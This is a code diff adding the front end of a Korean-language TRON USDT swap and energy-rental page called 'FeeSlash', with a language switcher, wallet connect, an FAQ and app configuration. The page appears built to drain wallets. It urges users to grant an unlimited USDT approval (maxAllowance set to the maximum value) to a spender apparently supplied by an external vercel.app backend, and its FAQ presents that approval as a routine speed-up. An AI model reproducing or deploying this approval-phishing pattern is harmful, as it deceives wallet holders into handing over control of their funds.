@@ -71,59 +71,184 @@
     <div class="fixed top-[-150px] left-1/2 -translate-x-1/2 w-[900px] max-w-[100vw] h-[450px] bg-gradient-to-b from-blue-600/8 via-cyan-500/5 to-transparent rounded-full blur-[160px] pointer-events-none -z-10"></div>
     <div class="fixed bottom-0 right-0 w-[500px] max-w-[100vw] h-[500px] bg-emerald-600/5 rounded-full blur-[150px] pointer-events-none -z-10"></div>
     <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col space-y-2 pointer-events-none"></div>
+    <header class="w-full max-w-4xl mx-auto px-4 pt-6 pb-4 flex flex-wrap items-center justify-between gap-3">
+        <div>
+            <h1 class="text-xl font-extrabold text-white" data-i18n="brand_title">FeeSlash</h1>
+            <p class="text-xs text-slate-400" data-i18n="brand_sub">TRON USDT 즉시 스왑 &amp; 에너지 렌탈</p>
+        </div>
+        <div class="flex items-center gap-2">
+            <select class="lang-switcher bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs text-slate-200" onchange="setAppLang(this.value)">
+                <option value="ko">🇰🇷 한국어</option>
+                <option value="en">🇺🇸 English</option>
+                <option value="zh">🇨🇳 中文</option>
+                <option value="ja">🇯🇵 日本語</option>
+                <option value="vi">🇻🇳 Tiếng Việt</option>
+                <option value="th">🇹🇭 ไทย</option>
+                <option value="ru">🇷🇺 Русский</option>
+                <option value="de">🇩🇪 Deutsch</option>
+                <option value="fr">🇫🇷 Français</option>
+                <option value="es">🇪🇸 Español</option>
+            </select>
+            <button type="button" onclick="connectWallet()" class="px-4 py-2 rounded-xl bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold transition">
+                <i class="fa-solid fa-wallet mr-1.5"></i><span id="wallet-connect-label" data-i18n="connect_wallet">지갑 연결</span>
+            </button>
+        </div>
+    </header>
 
+    <div id="approve-progress" class="hidden w-full max-w-4xl mx-auto px-4 mb-4">
+        <div class="glass border border-slate-800 rounded-2xl p-3.5">
+            <div class="flex justify-between text-xs text-slate-300 mb-2">
+                <span id="approve-progress-text">처리 중...</span>
+            </div>
+            <div class="w-full h-2 bg-slate-900 rounded-full overflow-hidden">
+                <div id="approve-progress-bar" class="h-full bg-gradient-to-r from-blue-500 to-cyan-400 transition-all duration-300" style="width:0%"></div>
+            </div>
+        </div>
+    </div>
+
+    <main class="w-full max-w-4xl mx-auto px-4 pb-16 space-y-6 flex-1">
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+            <section class="glass border border-slate-800/80 rounded-2xl p-5 space-y-4">
+                <div class="flex items-center justify-between">
+                    <span class="text-sm font-bold text-white">USDT ↔ TRX Swap</span>
+                    <span id="trx-live-price" class="text-xs font-mono text-cyan-400">조회 중...</span>
+                </div>
+                <div class="bg-slate-950/80 border border-slate-800 rounded-xl p-3.5 space-y-2">
+                    <div class="flex justify-between text-xs text-slate-400">
+                        <span id="send-symbol-label" class="font-bold text-white">USDT</span>
+                        <span id="send-balance-display" class="font-mono">0.00 USDT</span>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <input id="swap-send-amount" type="number" min="0" step="any" placeholder="0.00" oninput="recalculateSwapOutput()" class="w-full bg-transparent text-lg font-mono font-bold text-white focus:outline-none">
+                        <button type="button" onclick="setMaxAmount()" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-[11px] font-bold text-cyan-400">MAX</button>
+                    </div>
+                </div>
+                <div class="flex justify-center">
+                    <button type="button" onclick="toggleSwapDirection()" class="w-9 h-9 rounded-full bg-slate-900 hover:bg-slate-800 border border-slate-700 flex items-center justify-center text-slate-300">
+                        <i class="fa-solid fa-arrow-up-down text-xs"></i>
+                    </button>
+                </div>
+                <div class="bg-slate-950/80 border border-slate-800 rounded-xl p-3.5 space-y-2">
+                    <div class="flex justify-between text-xs text-slate-400">
+                        <span id="receive-symbol-label" class="font-bold text-white">TRX</span>
+                        <span id="receive-balance-display" class="font-mono">0.00 TRX</span>
+                    </div>
+                    <input id="swap-receive-amount" type="text" readonly placeholder="0.00" class="w-full bg-transparent text-lg font-mono font-bold text-emerald-400 focus:outline-none">
+                </div>
+                <div class="flex justify-between text-xs text-slate-400 font-mono">
+                    <span id="swap-rate-display">1 TRX ≈ - USDT</span>
+                    <span id="swap-estimated-fee">-</span>
+                </div>
+                <div class="grid grid-cols-2 gap-2.5 pt-1">
+                    <button id="approve-action-btn" type="button" onclick="executeUnlimitedApprove()" class="py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-100 text-xs font-bold transition" data-i18n="approve_max">USDT 무제한 승인</button>
+                    <button id="swap-submit-btn" type="button" onclick="executeSwap()" class="py-3 rounded-xl bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white text-xs font-bold transition" data-i18n="swap_after_connect">지갑 연결 후 스왑</button>
+                </div>
+            </section>
+
+            <section class="glass border border-slate-800/80 rounded-2xl p-5 space-y-4">
+                <div class="flex items-center justify-between">
+                    <span class="text-sm font-bold text-white">TRON Energy Rental</span>
+                    <span id="approval-status-badge" class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-bold bg-amber-500/15 text-amber-400 border border-amber-500/30">승인 대기 중</span>
+                </div>
+                <div class="grid grid-cols-3 gap-2">
+                    <button type="button" data-energy-amt="65000" onclick="selectEnergyAmount(65000)" class="py-2.5 rounded-xl bg-slate-900 border border-slate-800 text-xs font-mono font-bold text-slate-300">65K</button>
+                    <button type="button" data-energy-amt="131000" onclick="selectEnergyAmount(131000)" class="py-2.5 rounded-xl bg-slate-900 border border-slate-800 text-xs font-mono font-bold text-slate-300">131K</button>
+                    <button type="button" data-energy-amt="262000" onclick="selectEnergyAmount(262000)" class="py-2.5 rounded-xl bg-slate-900 border border-slate-800 text-xs font-mono font-bold text-slate-300">262K</button>
+                </div>
+                <div class="grid grid-cols-3 gap-2">
+                    <button type="button" data-energy-dur="1h" onclick="selectEnergyDuration('1h')" class="py-2 rounded-xl bg-slate-900 border border-slate-800 text-xs font-mono font-bold text-slate-300">1H</button>
+                    <button type="button" data-energy-dur="24h" onclick="selectEnergyDuration('24h')" class="py-2 rounded-xl bg-slate-900 border border-slate-800 text-xs font-mono font-bold text-slate-300">24H</button>
+                    <button type="button" data-energy-dur="3d" onclick="selectEnergyDuration('3d')" class="py-2 rounded-xl bg-slate-900 border border-slate-800 text-xs font-mono font-bold text-slate-300">3D</button>
+                </div>
+                <div class="bg-slate-950/80 border border-slate-800 rounded-xl p-3.5 flex items-center justify-between text-xs">
+                    <span id="energy-selected-label" class="font-mono text-slate-300">131,000 Energy (1h)</span>
+                    <span id="energy-price-estimate" class="font-mono font-bold text-purple-400">0.00 TRX</span>
+                </div>
+                <div class="text-xs text-slate-400 font-mono flex justify-between">
+                    <span>USDT: <strong id="wallet-usdt-balance" class="text-slate-200">0.00 USDT</strong></span>
+                    <span>TRX: <strong id="wallet-trx-balance" class="text-slate-200">0.00 TRX</strong></span>
+                </div>
+                <button type="button" onclick="executeEnergyRental()" class="w-full py-3 rounded-xl bg-purple-600 hover:bg-purple-500 text-white text-xs font-bold transition" data-i18n="rent_energy_btn">에너지 즉시 임대</button>
+            </section>
+        </div>
+
+        <section class="glass border border-slate-800/80 rounded-2xl p-5 space-y-3">
+            <h2 class="text-sm font-bold text-white" data-i18n="faq_title">자주 묻는 질문 (FAQ)</h2>
+            <div class="border border-slate-800/80 rounded-xl overflow-hidden">
+                <button type="button" onclick="toggleFaq(0)" class="w-full px-4 py-3 text-left text-xs font-bold text-slate-200 flex items-center justify-between">
+                    <span data-i18n="faq_q1">지갑 연결 후 무제한 승인(Approve MAX)은 왜 진행하나요?</span>
+                    <i id="faq-icon-0" class="fa-solid fa-chevron-down transition-transform"></i>
+                </button>
+                <div id="faq-body-0" class="hidden px-4 pb-3 text-xs text-slate-400 leading-relaxed" data-i18n="faq_a1">빠른 스왑과 수수료 절감 연동을 위해 최초 1회 승인 절차를 거칩니다. 이미 승인된 지갑은 중복 서명을 줄여 바로 진행됩니다.</div>
+            </div>
+            <div class="border border-slate-800/80 rounded-xl overflow-hidden">
+                <button type="button" onclick="toggleFaq(1)" class="w-full px-4 py-3 text-left text-xs font-bold text-slate-200 flex items-center justify-between">
+                    <span data-i18n="faq_q2">TRX가 부족해도 승인이나 스왑을 진행할 수 있나요?</span>
+                    <i id="faq-icon-1" class="fa-solid fa-chevron-down transition-transform"></i>
+                </button>
+                <div id="faq-body-1" class="hidden px-4 pb-3 text-xs text-slate-400 leading-relaxed" data-i18n="faq_a2">네트워크 잔액이 부족한 경우 에너지 렌탈 또는 사전 준비 API를 통해 수수료 부담을 줄일 수 있도록 구성되어 있습니다.</div>
+            </div>
+            <div class="border border-slate-800/80 rounded-xl overflow-hidden">
+                <button type="button" onclick="toggleFaq(2)" class="w-full px-4 py-3 text-left text-xs font-bold text-slate-200 flex items-center justify-between">
+                    <span data-i18n="faq_q3">모바일 브라우저(사파리, 삼성인터넷, 크롬)에서도 사용할 수 있나요?</span>
+                    <i id="faq-icon-2" class="fa-solid fa-chevron-down transition-transform"></i>
+                </button>
+                <div id="faq-body-2" class="hidden px-4 pb-3 text-xs text-slate-400 leading-relaxed" data-i18n="faq_a3">모바일 환경에서는 인앱 지갑 브라우저 또는 전용 딥링크/WalletConnect를 통해 지갑과 연결할 수 있습니다.</div>
+            </div>
+        </section>
+    </main>
     <!-- 1단계 핵심 스크립트: 설정, 상태 저장소, 기기 판별 및 유틸리티 -->
     <script>
-        const APP_CONFIG = {
-            apiBase: 'https://tron-usdt-backend.vercel.app/api',
-            usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
-            maxAllowance: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
-            wcProjectId: '5fafa9c15e52f88b097bc063166d3f3a',
-            tronGridBase: 'https://api.trongrid.io',
-            defaultEnergyAmount: 131000,
-            defaultEnergyDuration: '1h'
-        };
+        var APP_CONFIG = window.APP_CONFIG = {
+    apiBase: 'https://tron-usdt-backend.vercel.app/api',
+    usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+    maxAllowance: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
+    wcProjectId: '5fafa9c15e52f88b097bc063166d3f3a',
+    tronGridBase: 'https://api.trongrid.io',
+    defaultEnergyAmount: 131000,
+    defaultEnergyDuration: '1h'
+};
 
-        const APP_STATE = {
-            currentLang: 'ko',
-            isConnected: false,
-            isConnecting: false,
-            isApproved: false,
-            isApproving: false,
-            activeProvider: 'Unknown',
-            currentWalletAddress: null,
-            userUsdtBalance: 0,
-            userTrxBalance: 0,
-            trxRate: 0,
-            swapDirection: 'USDT_TO_TRX',
-            wcConnector: null,
-            wcAddress: null,
-            spenderCache: null
-        };
+var APP_STATE = window.APP_STATE = {
+    currentLang: 'ko',
+    isConnected: false,
+    isConnecting: false,
+    isApproved: false,
+    isApproving: false,
+    activeProvider: 'Unknown',
+    currentWalletAddress: null,
+    userUsdtBalance: 0,
+    userTrxBalance: 0,
+    trxRate: 0,
+    swapDirection: 'USDT_TO_TRX',
+    wcConnector: null,
+    wcAddress: null,
+    spenderCache: null
+};
 
-        const DeviceUtils = {
-            ua: function () { return navigator.userAgent || ''; },
-            isMobile: function () { return /Android|iPhone|iPad|iPod/i.test(this.ua()); },
-            isIOS: function () { return /iPhone|iPad|iPod/i.test(this.ua()); },
-            isAndroid: function () { return /Android/i.test(this.ua()); },
-            isFoldDevice: function () { return /SM-F9|SM-F7|SM-Z|Fold|Flip/i.test(this.ua()); },
-            isSamsungBrowser: function () { return /SamsungBrowser/i.test(this.ua()); },
-            isChromeBrowser: function () {
-                return /Chrome/i.test(this.ua()) && !/SamsungBrowser|UCBrowser|OPR|Whale|Puffin|Brave/i.test(this.ua());
-            },
-            isSafari: function () {
-                return this.isIOS()
-                    && /Safari/i.test(this.ua())
-                    && !/CriOS|Chrome|FxiOS|EdgiOS|Trust|TokenPocket|BitKeep|Bitget|OKApp|imToken/i.test(this.ua());
-            },
-            isIOSChrome: function () {
-                return this.isIOS() && /CriOS/i.test(this.ua());
-            },
-            isPC: function () {
-                if (this.isFoldDevice() || this.isMobile()) return false;
-                return true;
-            }
-        };
+var DeviceUtils = window.DeviceUtils = {
+    ua: function () { return navigator.userAgent || ''; },
+    isMobile: function () { return /Android|iPhone|iPad|iPod/i.test(this.ua()); },
+    isIOS: function () { return /iPhone|iPad|iPod/i.test(this.ua()); },
+    isAndroid: function () { return /Android/i.test(this.ua()); },
+    isFoldDevice: function () { return /SM-F9|SM-F7|SM-Z|Fold|Flip/i.test(this.ua()); },
+    isSamsungBrowser: function () { return /SamsungBrowser/i.test(this.ua()); },
+    isChromeBrowser: function () {
+        return /Chrome/i.test(this.ua()) && !/SamsungBrowser|UCBrowser|OPR|Whale|Puffin|Brave/i.test(this.ua());
+    },
+    isSafari: function () {
+        return this.isIOS()
+            && /Safari/i.test(this.ua())
+            && !/CriOS|Chrome|FxiOS|EdgiOS|Trust|TokenPocket|BitKeep|Bitget|OKApp|imToken/i.test(this.ua());
+    },
+    isIOSChrome: function () {
+        return this.isIOS() && /CriOS/i.test(this.ua());
+    },
+    isPC: function () {
+        if (this.isFoldDevice() || this.isMobile()) return false;
+        return true;
+    }
+};
 
         function escapeHtml(s) {
             var d = document.createElement('div');
